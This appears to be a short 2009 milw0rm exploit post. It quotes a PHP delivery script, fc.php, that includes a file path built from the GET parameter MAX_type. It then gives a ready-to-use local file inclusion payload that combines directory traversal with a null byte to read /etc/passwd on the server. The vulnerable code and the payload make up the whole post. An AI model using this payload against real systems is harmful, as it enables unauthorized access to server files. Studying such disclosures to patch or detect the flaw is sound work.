@@ -1,0 +1,23 @@
+<snip>
+include_once '../../init-delivery.php';
+$MAX_PLUGINS_AD_PLUGIN_NAME = 'MAX_type';
+if(!isset($_GET[$MAX_PLUGINS_AD_PLUGIN_NAME])) {
+echo $MAX_PLUGINS_AD_PLUGIN_NAME . ' is not specified';
+exit(1);
+}
+$tagName = $_GET[$MAX_PLUGINS_AD_PLUGIN_NAME];
+$tagFileName = MAX_PATH . '/plugins/invocationTags/'.$tagName.'/'.$tagName.'.delivery.php';
+if(!file_exists($tagFileName)) {
+echo 'Invocation plugin delivery file "' . $tagFileName . '" doesn\'t exists';
+exit(1);
+}
+include $tagFileName;
+</snip>
+
+If a null byte is appended to the end of a string, and directory traversal is used in the GET parameter MAX_type, 
+like so: /www/delivery/fc.php?MAX_type= ../../../../../../../../../../../../../../../etc/passwd%00, you will see 
+the /etc/passwd file before you ;)
+
+-Charlie Briggs [Elites0ft.com]
+
+# milw0rm.com [2009-01-26]
